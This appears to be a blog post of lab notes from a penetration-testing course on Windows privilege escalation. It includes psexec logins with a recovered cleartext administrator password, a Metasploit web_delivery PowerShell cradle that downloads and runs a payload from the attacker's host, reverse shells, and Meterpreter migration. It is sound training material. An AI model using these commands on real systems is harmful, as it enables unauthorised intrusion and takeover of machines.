---
layout: post
title: "Windows Privilege Escalation"
date: "2023-06-28"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Windows Privilege Escalation（Windows权限提升）
# Demo: Windows Privilege Escalation（演示：Windows权限提升）
We will be exploring the process of utilizing the credentials we obtained in the previous video when we were taking a look at how to identify Windows Privilege Escalation vulnerabilities and we'll be exploring how we can use these credentials to receive an elevated session on the target system that we have compromised.

Target IP Address : 10.4.21.189

We identified that there is a privilege escalation vulnerability pertinent to credentials and more specifically the WinLogon feature. The WinLogon feature is a feature on Windows that allows you to configure a Windows system to automatically log on and the credentials for this specific user to log on are typically stored in the Windows registry. Based on how a system is configured and secured it is always recommended to encrypt these log on credentials when they're stored in the registry.


The administrator account on a Windows system is pretty much the user account that has the highest level of privileges available. And we have the clear text password which means in this case we do not even need to crack any hashes, I've got the credentials that we're looking for.

```
Domain   :
Username : administrator
Password : hello_123321
```

What can we do with this information, how do we elevate our privileges, how do we switch to the administrator user.

Let's get started with the first technique, and we'll explore how to do this with and without meterpreter or the Metasploit Framework.

Once you've gathered these credentials that every Windows system will have SMB running and as part of the wide variety of features that Windows has, one of the features that it has is the ability to authenticate with SMB and we can utilize a Python implementation of the `psexec` utility to log in to the target system and obtain an elevated session because we have administrator credentials.

Open up a new tab

```
psexec.py Administrator@10.4.21.189
```

We're provided with a command shell session.

What privileges do I currently have or what user do I currently have access on the target system:

```
whoami
```

`nt authority\system`: which is the highest privileges available on a Windows system.

```
net user
```

These are all the user accounts on the system.

```
whoami /priv
```

We should have all the privileges that you typically have if you gained access to a target system as the administrator user.

So we've elevated our privileges and this was all facilitated through the use of the PrivescCheck script.

This is the one way you can use the credentials and this psexec authenticates to the target system via SMB and remember the great thing about this is we're not exploiting the system, we're just authenticating legitimately because we've obtained legitimate credentials.

If you want to obtain an elevated meterpreter session, and you have the administrators credentials, you can also do this within the Metasploit Framework.

I'll just terminate this particular channel here and I'll put my meterpreter session in the background.

Remember this is an unprivileged meterpreter session.

If I list out my session,

```
sessions
```

we have the standard command shell and then we have the unprivileged meterpreter session, this was we had access through the student user.

[Microsoft Windows Authenticated User Code Execution](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/)

Microsoft Windows Authenticated User Code Execution

This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the "psexec" utility provided by SysInternals. This module is now able to clean up after itself. The service created by this tool uses a randomly chosen name and description.

Microsoft Windows身份验证用户代码执行

该模块使用有效的管理员用户名和密码（或密码哈希）来执行任意有效载荷。该模块类似于SysInternals提供的“psexec”实用程序。该模块现在能够自我清理。此工具创建的服务使用随机选择的名称和描述。

```
search psexec
use exploit/windows/smb/psexec
show options
set LPORT 4422
set RHOSTS 10.4.21.189
set SMBUser administrator
set SMBPass hello_123321
exploit
```

We should receive an elevated meterpreter session.

```
sysinfo
getuid
```

`NT AUTHORITY\SYSTEM`: we have successfully been able to elevate our privileges on a Windows system.

# Windows: PrivescCheck
## Overview
A Kali GUI machine and a Windows machine provided to you. 

Your task is to run [PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck) script to find a common Windows privilege escalation flaw that depends on misconfigurations.  The PrivescCheck script enumerates common Windows configuration issues that can be leveraged for local privilege escalation.

Objective: Gain Administrator user privilege and find the flag.

Instructions:

* You can check the IP address of the machine by running "ipconfig" command on the command prompt i.e cmd.exe
* Do not attack the gateway located at IP address 10.0.0.1

## Solutions
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-2404.pdf

# Windows：PrivescCheck
## 概述
提供给您一个Kali GUI机器和一个Windows机器。

您的任务是运行[PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck)脚本，以查找依赖于错误配置的常见Windows权限提升漏洞。 PrivescCheck脚本枚举了可用于本地权限提升的常见Windows配置问题。

目标：获得管理员用户权限并找到标志。

说明：

* 您可以通过在命令提示符即cmd.exe上运行“ipconfig”命令来检查机器的IP地址。
* 不要攻击位于IP地址10.0.0.1的网关。

## 解决方案
此实验室的解决方案可以在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-2404.pdf

## 复现视频内容
Target Machine IP Address: : 10.0.26.5

Kali Linux : 10.10.16.3

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 12 database server: main.
msf5 > search web_delivery

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   1  exploit/multi/script/web_delivery                           2013-07-19       manual     No     Script Web Delivery


Interact with a module by name or index, for example use 1 or use exploit/multi/script/web_delivery

msf5 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf5 exploit(multi/script/web_delivery) > show options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Python
```

```
msf5 exploit(multi/script/web_delivery) > set target 
set target 0              set target 3              set target 6              set target Mac\ OS\ X     set target PSH\ (Binary)  set target pubprn
set target 1              set target 4              set target 7              set target PHP            set target Python         
set target 2              set target 5              set target Linux          set target PSH            set target Regsvr32       
msf5 exploit(multi/script/web_delivery) > set target PSH
set target PSH            set target PSH\ (Binary)  
msf5 exploit(multi/script/web_delivery) > set target PSH\ (Binary) 
target => PSH (Binary)
msf5 exploit(multi/script/web_delivery) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
```

```
msf5 exploit(multi/script/web_delivery) > show advanced

Module advanced options (exploit/multi/script/web_delivery):

   Name                                    Current Setting  Required  Description
   ----                                    ---------------  --------  -----------
   PSH-EncodedCommand                      true             yes       PSH - Use -EncodedCommand for web_delivery launcher

```

```
msf5 exploit(multi/script/web_delivery) > set PSH-EncodedCommand false
PSH-EncodedCommand => false
```

```
msf5 exploit(multi/script/web_delivery) > set LHOST eth1
LHOST => 10.10.16.3
msf5 exploit(multi/script/web_delivery) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.16.3:4444 
msf5 exploit(multi/script/web_delivery) > [*] Using URL: http://0.0.0.0:8080/LbU7oO
[*] Local IP: http://10.10.16.3:8080/LbU7oO
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ($env:temp+'\3Z8aOl0H.exe')"; (new-object System.Net.WebClient).DownloadFile('http://10.10.16.3:8080/LbU7oO', $z); invoke-item $z

```

Victim Machine:

open up a command prompt session. Paste in the command that you copied.

```
msf5 exploit(multi/script/web_delivery) > [*] Using URL: http://0.0.0.0:8080/LbU7oO
[*] Local IP: http://10.10.16.3:8080/LbU7oO
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ($env:temp+'\3Z8aOl0H.exe')"; (new-object System.Net.WebClient).DownloadFile('http://10.10.16.3:8080/LbU7oO', $z); invoke-item $z
[*] 10.0.26.5        web_delivery - Delivering Payload (73802 bytes)
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.0.26.5
[*] Command shell session 1 opened (10.10.16.3:4444 -> 10.0.26.5:49756) at 2023-06-28 14:39:36 +0530
```

```
msf5 exploit(multi/script/web_delivery) > sessions

Active sessions
===============

  Id  Name  Type               Information                                                                       Connection
  --  ----  ----               -----------                                                                       ----------
  1         shell x86/windows  Microsoft Windows [Version 10.0.17763.1457] (c) 2018 Microsoft Corporation. A...  10.10.16.3:4444 -> 10.0.26.5:49756 (10.0.26.5)

msf5 exploit(multi/script/web_delivery) > sessions 1
[*] Starting interaction with 1...

whoami
whoami
attackdefense\student

C:\Users\student>hostname
hostname
AttackDefense

C:\Users\student>^Z
Background session 1? [y/N]  y
```

```
msf5 exploit(multi/script/web_delivery) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


msf5 exploit(multi/script/web_delivery) > use post/multi/manage/shell_to_meterpreter
msf5 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
msf5 post(multi/manage/shell_to_meterpreter) > show advanced

Module advanced options (post/multi/manage/shell_to_meterpreter):

   Name                                    Current Setting  Required  Description
   ----                                    ---------------  --------  -----------
   WIN_TRANSFER                            POWERSHELL       yes       Which method to try first to transfer files on a Windows target. (Accepted: POWERSHELL, VBS)
msf5 post(multi/manage/shell_to_meterpreter) > set WIN_TRANSFER VBS
WIN_TRANSFER => VBS

```

```
msf5 post(multi/manage/shell_to_meterpreter) > exploit

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.16.3:4433 
[*] Command stager progress: 1.66% (1699/102108 bytes)
[*] Command stager progress: 3.33% (3398/102108 bytes)
[*] Command stager progress: 98.15% (100216/102108 bytes)
[*] Command stager progress: 99.78% (101888/102108 bytes)
[*] Sending stage (176195 bytes) to 10.0.26.5
[*] Command stager progress: 100.00% (102108/102108 bytes)
[*] Post module execution completed
msf5 post(multi/manage/shell_to_meterpreter) > [*] Meterpreter session 2 opened (10.10.16.3:4433 -> 10.0.26.5:49776) at 2023-06-28 14:48:15 +0530

[*] Stopping exploit/multi/handler
```

```
msf5 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  1         shell x86/windows        Microsoft Windows [Version 10.0.17763.1457] (c) 2018 Microsoft Corporation. A...  10.10.16.3:4444 -> 10.0.26.5:49756 (10.0.26.5)
  2         meterpreter x86/windows  ATTACKDEFENSE\student @ ATTACKDEFENSE                                             10.10.16.3:4433 -> 10.0.26.5:49776 (10.0.26.5)

msf5 post(multi/manage/shell_to_meterpreter) > sessions 2
[*] Starting interaction with 2...

meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid
Server username: ATTACKDEFENSE\student
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
```

```
meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User                   Path
 ---   ----  ----                     ----  -------  ----                   ----
 0     0     [System Process]                                               
 4     0     System                                                         
 88    4     Registry                                                       
 396   4     smss.exe                                                       
 484   772   svchost.exe                                                    
 504   772   svchost.exe                                                    
 536   704   dwm.exe                                                        
 560   548   csrss.exe                                                      
 636   548   wininit.exe                                                    
 644   628   csrss.exe                                                      
 664   5104  winlogon.exe                                                   
 704   628   winlogon.exe                                                   
 772   636   services.exe                                                   
 784   636   lsass.exe                                                      
 888   772   svchost.exe                                                    
 908   772   svchost.exe                                                    
 928   636   fontdrvhost.exe                                                
 932   704   fontdrvhost.exe                                                
 1012  772   svchost.exe                                                    
 1068  772   svchost.exe                                                    
 1116  772   svchost.exe                                                    
 1124  772   svchost.exe                                                    
 1232  908   WmiPrvSE.exe                                                   
 1260  772   svchost.exe                                                    
 1272  664   dwm.exe                                                        
 1296  772   svchost.exe                                                    
 1308  772   vds.exe                                                        
 1356  772   svchost.exe                                                    
 1368  772   svchost.exe                                                    
 1388  772   svchost.exe                                                    
 1404  772   svchost.exe                                                    
 1420  772   svchost.exe                                                    
 1480  772   svchost.exe                                                    
 1516  908   dllhost.exe              x64   2        ATTACKDEFENSE\student  C:\Windows\System32\dllhost.exe
 1528  772   svchost.exe                                                    
 1536  772   svchost.exe                                                    
 1604  772   svchost.exe                                                    
 1656  772   svchost.exe                                                    
 1664  772   svchost.exe                                                    
 1744  4152  conhost.exe              x64   2        ATTACKDEFENSE\student  C:\Windows\System32\conhost.exe
 1760  772   svchost.exe                                                    
 1776  772   svchost.exe                                                    
 1796  772   svchost.exe                                                    
 1872  3420  ctfmon.exe                                                     
 1908  772   svchost.exe                                                    
 1932  772   svchost.exe                                                    
 1984  2244  conhost.exe              x64   2        ATTACKDEFENSE\student  C:\Windows\System32\conhost.exe
 2024  772   svchost.exe                                                    
 2080  772   svchost.exe                                                    
 2092  772   svchost.exe                                                    
 2100  772   svchost.exe                                                    
 2168  772   svchost.exe                                                    
 2180  1448  explorer.exe             x64   2        ATTACKDEFENSE\student  C:\Windows\explorer.exe
 2244  3428  cmd.exe                  x86   2        ATTACKDEFENSE\student  C:\Windows\SysWOW64\cmd.exe
 2304  772   svchost.exe                                                    
 2392  772   svchost.exe                                                    
 2432  772   svchost.exe                                                    
 2532  772   spoolsv.exe                                                    
 2592  772   svchost.exe                                                    
 2620  772   svchost.exe                                                    
 2636  772   svchost.exe                                                    
 2656  772   LiteAgent.exe                                                  
 2708  772   svchost.exe                                                    
 2756  772   svchost.exe                                                    
 2780  772   svchost.exe                                                    
 2804  772   svchost.exe                                                    
 2828  772   svchost.exe                                                    
 2912  772   svchost.exe                                                    
 2936  1212  BdBtS.exe                x86   2        ATTACKDEFENSE\student  C:\Users\student\AppData\Local\Temp\2\BdBtS.exe
 2944  772   svchost.exe                                                    
 3056  772   svchost.exe              x64   2        ATTACKDEFENSE\student  C:\Windows\System32\svchost.exe
 3268  504   rdpclip.exe              x64   2        ATTACKDEFENSE\student  C:\Windows\System32\rdpclip.exe
 3368  772   svchost.exe                                                    
 3396  5104  csrss.exe                                                      
 3412  772   svchost.exe                                                    
 3420  772   svchost.exe                                                    
 3428  4836  3Z8aOl0H.exe             x86   2        ATTACKDEFENSE\student  C:\Users\student\AppData\Local\Temp\2\3Z8aOl0H.exe
 3548  772   svchost.exe                                                    
 3596  1536  taskhostw.exe            x64   2        ATTACKDEFENSE\student  C:\Windows\System32\taskhostw.exe
 3652  772   svchost.exe                                                    
 3656  772   svchost.exe                                                    
 3716  664   fontdrvhost.exe                                                
 3776  772   svchost.exe                                                    
 3892  2092  sihost.exe                                                     
 3904  772   svchost.exe                                                    
 3928  772   svchost.exe                                                    
 3948  1536  taskhostw.exe                                                  
 4112  3676  explorer.exe                                                   
 4152  2180  cmd.exe                  x64   2        ATTACKDEFENSE\student  C:\Windows\System32\cmd.exe
 4344  908   ShellExperienceHost.exe                                        
 4476  908   SearchUI.exe                                                   
 4544  908   RuntimeBroker.exe                                              
 4672  908   RuntimeBroker.exe                                              
 4924  908   RuntimeBroker.exe                                              
 4992  772   svchost.exe              x64   2        ATTACKDEFENSE\student  C:\Windows\System32\svchost.exe
 5012  2092  sihost.exe               x64   2        ATTACKDEFENSE\student  C:\Windows\System32\sihost.exe
 5216  908   ShellExperienceHost.exe  x64   2        ATTACKDEFENSE\student  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
 5296  3420  ctfmon.exe               x64   2                               
 5368  908   SearchUI.exe             x64   2        ATTACKDEFENSE\student  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
 5412  772   msdtc.exe                                                      
 5452  908   RuntimeBroker.exe        x64   2        ATTACKDEFENSE\student  C:\Windows\System32\RuntimeBroker.exe
 5692  908   RuntimeBroker.exe        x64   2        ATTACKDEFENSE\student  C:\Windows\System32\RuntimeBroker.exe
 5852  772   svchost.exe                                                    
 5888  908   RuntimeBroker.exe        x64   2        ATTACKDEFENSE\student  C:\Windows\System32\RuntimeBroker.exe
 6016  772   svchost.exe                                                    
 6064  772   amazon-ssm-agent.exe                                           
```

```
2180  1448  explorer.exe             x64   2        ATTACKDEFENSE\student  C:\Windows\explorer.exe
4112  3676  explorer.exe                                                   
2936  1212  BdBtS.exe                x86   2        ATTACKDEFENSE\student  C:\Users\student\AppData\Local\Temp\2\BdBtS.exe
```

```
meterpreter > migrate 2180
[*] Migrating from 2936 to 2180...
[*] Migration completed successfully.
meterpreter > getuid
Server username: ATTACKDEFENSE\student
meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
```

```
meterpreter > cd C:\\
meterpreter > cd Users
meterpreter > cd student
meterpreter > cd Desktop
meterpreter > cd PrivescCheck
meterpreter > dir
Listing: C:\Users\student\Desktop\PrivescCheck
==============================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100666/rw-rw-rw-  5112    fil   2021-06-14 15:08:54 +0530  Build.ps1
100666/rw-rw-rw-  4812    fil   2021-06-14 15:08:54 +0530  CHANGELOG
100666/rw-rw-rw-  3473    fil   2021-06-14 15:08:54 +0530  INFORMATION.md
100666/rw-rw-rw-  1522    fil   2021-06-14 15:08:54 +0530  LICENSE
100666/rw-rw-rw-  137714  fil   2021-06-14 15:08:54 +0530  PrivescCheck.ps1
100666/rw-rw-rw-  301684  fil   2021-06-14 15:08:54 +0530  PrivescCheckOld.ps1
100666/rw-rw-rw-  3042    fil   2021-06-14 15:08:54 +0530  README.md
40777/rwxrwxrwx   4096    dir   2021-06-15 17:02:53 +0530  src
meterpreter > shell
Process 3628 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\student\Desktop\PrivescCheck>
```

```
C:\Users\student\Desktop\PrivescCheck>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+------+------------------------------------------------+------+
| TEST | USER > Identity                                | INFO |
+------+------------------------------------------------+------+
| DESC | Get the full name of the current user (domain +       |
|      | username) along with the associated Security          |
|      | Identifier (SID).                                     |
+------+-------------------------------------------------------+
[*] Found 1 result(s).

DisplayName           SID                                           Type
-----------           ---                                           ----
ATTACKDEFENSE\student S-1-5-21-3688751335-3073641799-161370460-1008 User




+------+------------------------------------------------+------+
| TEST | USER > Groups                                  | INFO |
+------+------------------------------------------------+------+
| DESC | List all the groups that are associated to the        |
|      | current user's token.                                 |
+------+-------------------------------------------------------+
[*] Found 13 result(s).

Name                                   Type           SID                                         
----                                   ----           ---                                         
ATTACKDEFENSE\None                     Group          S-1-5-21-3688751335-3073641799-161370460-513
Everyone                               WellKnownGroup S-1-1-0                                     
BUILTIN\Remote Desktop Users           Alias          S-1-5-32-555                                
BUILTIN\Users                          Alias          S-1-5-32-545                                
NT AUTHORITY\REMOTE INTERACTIVE LOGON  WellKnownGroup S-1-5-14                                    
NT AUTHORITY\INTERACTIVE               WellKnownGroup S-1-5-4                                     
NT AUTHORITY\Authenticated Users       WellKnownGroup S-1-5-11                                    
NT AUTHORITY\This Organization         WellKnownGroup S-1-5-15                                    
NT AUTHORITY\Local account             WellKnownGroup S-1-5-113                                   
NT AUTHORITY\LogonSessionId_0_881285   LogonSession   S-1-5-5-0-881285                            
LOCAL                                  WellKnownGroup S-1-2-0                                     
NT AUTHORITY\NTLM Authentication       WellKnownGroup S-1-5-64-10                                 
Mandatory Label\Medium Mandatory Level Label          S-1-16-8192                                 




+------+------------------------------------------------+------+
| TEST | USER > Privileges                              | INFO |
+------+------------------------------------------------+------+
| DESC | List the current user's privileges and identify the   |
|      | ones that can be leveraged for local privilege        |
|      | escalation.                                           |
+------+-------------------------------------------------------+
[*] Found 2 result(s).

Name                          State   Description                    Exploitable
----                          -----   -----------                    -----------
SeChangeNotifyPrivilege       Enabled Bypass traverse checking             False
SeIncreaseWorkingSetPrivilege Enabled Increase a process working set       False




+------+------------------------------------------------+------+
| TEST | USER > Environment Variables                   | INFO |
+------+------------------------------------------------+------+
| DESC | List the environment variables of the current process |
|      | and try to identify any potentially sensitive         |
|      | information such as passwords or API secrets. This    |
|      | check is simply based on keyword matching and might   |
|      | not be entirely reliable.                             |
+------+-------------------------------------------------------+
[!] Nothing found.


+------+------------------------------------------------+------+
| TEST | SERVICES > Non-default Services                | INFO |
+------+------------------------------------------------+------+
| DESC | List all registered services and filter out the ones  |
|      | that are built into Windows. It does so by parsing    |
|      | the target executable's metadata.                     |
+------+-------------------------------------------------------+
[*] Found 5 result(s).


Name        : AmazonSSMAgent
DisplayName : Amazon SSM Agent
ImagePath   : "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"
User        : LocalSystem
StartMode   : Automatic

Name        : AWSLiteAgent
DisplayName : AWS Lite Guest Agent
ImagePath   : "C:\Program Files\Amazon\XenTools\LiteAgent.exe"
User        : LocalSystem
StartMode   : Automatic

Name        : cfn-hup
DisplayName : CloudFormation cfn-hup
ImagePath   : "C:\Program Files\Amazon\cfn-bootstrap\winhup.exe"
User        : LocalSystem
StartMode   : Manual

Name        : MozillaMaintenance
DisplayName : Mozilla Maintenance Service
ImagePath   : "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
User        : LocalSystem
StartMode   : Manual

Name        : ssh-agent
DisplayName : OpenSSH Authentication Agent
ImagePath   : C:\Windows\System32\OpenSSH\ssh-agent.exe
User        : LocalSystem
StartMode   : Disabled





+------+------------------------------------------------+------+
| TEST | SERVICES > Service Permissions                 | VULN |
+------+------------------------------------------------+------+
| DESC | Interact with the Service Control Manager (SCM) and   |
|      | check whether the current user can modify any         |
|      | registered service.                                   |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | SERVICES > Registry Permissions                | VULN |
+------+------------------------------------------------+------+
| DESC | Parse the registry and check whether the current user |
|      | can modify the configuration of any registered        |
|      | service.                                              |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | SERVICES > Binary Permissions                  | VULN |
+------+------------------------------------------------+------+
| DESC | List all services and check whether the current user  |
|      | can modify the target executable or write files in    |
|      | its parent folder.                                    |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | SERVICES > Unquoted Path                       | VULN |
+------+------------------------------------------------+------+
| DESC | List registered services and check whether any of     |
|      | them is configured with an unquoted path that can be  |
|      | exploited.                                            |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | SERVICES > SCM Permissions                     | VULN |
+------+------------------------------------------------+------+
| DESC | Check whether the current user can perform any        |
|      | privileged actions on the Service Control Manager     |
|      | (SCM).                                                |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | SCHEDULED TASKS > Binary Permissions           | VULN |
+------+------------------------------------------------+------+
| DESC | Enumerate the scheduled tasks that are not owned by   |
|      | the current user and checks whether the target binary |
|      | can be modified. Note that, as a low-privileged user, |
|      | it's not possible to enumerate all the scheduled      |
|      | tasks.                                                |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | SCHEDULED TASKS > Unquoted Path                | VULN |
+------+------------------------------------------------+------+
| DESC | Enumerate the scheduled tasks that are not owned by   |
|      | the current user and checks whether the corresponding |
|      | command uses an exploitable unquoted path. Note that, |
|      | as a low-privileged user, it's not possible to        |
|      | enumerate all the scheduled tasks.                    |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CREDS > SAM/SYSTEM Backup Files                | VULN |
+------+------------------------------------------------+------+
| DESC | Check whether some backup files of the SAM/SYSTEM     |
|      | hives were created with insecure permissions."        |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CREDS > Unattend Files                         | VULN |
+------+------------------------------------------------+------+
| DESC | Locate 'Unattend' files and check whether they        |
|      | contain any clear-text credentials.                   |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CREDS > WinLogon                               | VULN |
+------+------------------------------------------------+------+
| DESC | Parse the Winlogon registry keys and check whether    |
|      | they contain any clear-text password. Entries that    |
|      | have an empty password field are filtered out.        |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Domain   : 
Username : administrator
Password : hello_123321





+------+------------------------------------------------+------+
| TEST | CREDS > Vault Creds                            | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate the credentials that are saved in the       |
|      | current user's vault.                                 |
+------+-------------------------------------------------------+
[!] Nothing found.


+------+------------------------------------------------+------+
| TEST | CREDS > Vault List                             | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate the web credentials that are saved in the   |
|      | current user's Vault.                                 |
+------+-------------------------------------------------------+
[!] Nothing found.


+------+------------------------------------------------+------+
| TEST | CREDS > GPP Passwords                          | VULN |
+------+------------------------------------------------+------+
| DESC | Locate old cached Group Policy Preference files that  |
|      | contain a 'cpassword' field and extract the           |
|      | clear-text credentials.                               |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | HARDENING > LSA Protection (RunAsPPL)          | INFO |
+------+------------------------------------------------+------+
| DESC | Checks whether LSA protection (a.k.a. RunAsPPL) is    |
|      | supported and enabled.                                |
+------+-------------------------------------------------------+
[*] Found 1 result(s).

Name     Status Description               
----     ------ -----------               
RunAsPPL  False RunAsPPL is not configured




+------+------------------------------------------------+------+
| TEST | HARDENING > Credential Guard                   | INFO |
+------+------------------------------------------------+------+
| DESC | Checks whether Credential Guard is supported and      |
|      | enabled.                                              |
+------+-------------------------------------------------------+
[*] Found 1 result(s).

Name             Status Description                       
----             ------ -----------                       
Credential Guard  False Credential Guard is not configured




+------+------------------------------------------------+------+
| TEST | HARDENING > BitLocker                          | INFO |
+------+------------------------------------------------+------+
| DESC | Check whether BitLocker is configured and enabled on  |
|      | the system drive. Note that this check will yield a   |
|      | false positive if another encryption software is in   |
|      | use.                                                  |
+------+-------------------------------------------------------+
[!] Nothing found.


+------+------------------------------------------------+------+
| TEST | CONFIG > PATH Folder Permissions               | VULN |
+------+------------------------------------------------+------+
| DESC | Retrieve the list of SYSTEM %PATH% folders and check  |
|      | whether the current user has some write permissions   |
|      | in any of them.                                       |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | MISC > Hijackable DLLs                         | INFO |
+------+------------------------------------------------+------+
| DESC | List Windows services that are prone to Ghost DLL     |
|      | hijacking. This is particularly relevant if the       |
|      | current user can create files in one of the SYSTEM    |
|      | %PATH% folders.                                       |
+------+-------------------------------------------------------+
[*] Found 3 result(s).


Name           : cdpsgshims.dll
Description    : Loaded by CDPSvc upon service startup
RunAs          : NT AUTHORITY\LocalService
RebootRequired : True

Name           : WptsExtensions.dll
Description    : Loaded by the Task Scheduler upon service startup
RunAs          : LocalSystem
RebootRequired : True

Name           : wlanapi.dll
Description    : Loaded by NetMan when listing network interfaces
RunAs          : LocalSystem
RebootRequired : False





+------+------------------------------------------------+------+
| TEST | CONFIG > AlwaysInstallElevated                 | VULN |
+------+------------------------------------------------+------+
| DESC | Check whether the 'AlwaysInstallElevated' registry    |
|      | keys are configured and enabled. If so any user might |
|      | be able to run arbitary MSI files with SYSTEM         |
|      | privileges.                                           |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CONFIG > WSUS Configuration                    | VULN |
+------+------------------------------------------------+------+
| DESC | If WSUS is in use, this check will determine whether  |
|      | or not it uses a secure URL. If not, it might be      |
|      | vulnerable to MitM attacks (c.f. 'WSUXploit' /        |
|      | 'WSuspicious').                                       |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CONFIG > SCCM Cache Folder                     | VULN |
+------+------------------------------------------------+------+
| DESC | Checks whether the current user can browse the SCCM   |
|      | cache folder. If so, hardcoded credentials might be   |
|      | extracted from MSI package files or scripts.          |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | UPDATES > System up to date?                   | VULN |
+------+------------------------------------------------+------+
| DESC | Enumerate the installed updates and hotfixes and      |
|      | check whether a patch was applied in the last 31      |
|      | days.                                                 |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


HotFixID    : KB4570720
Description : Update
InstalledBy : ATTACKDEFENSE\Administrator
InstalledOn : 11/7/2020 7:25:04 AM





+-----------------------------------------------------------------------------+
|                         ~~~ PrivescCheck Report ~~~                         |
+----+------+-----------------------------------------------------------------+
| OK | None | CONFIG > WSUS Configuration                                     |
| OK | None | CONFIG > AlwaysInstallElevated                                  |
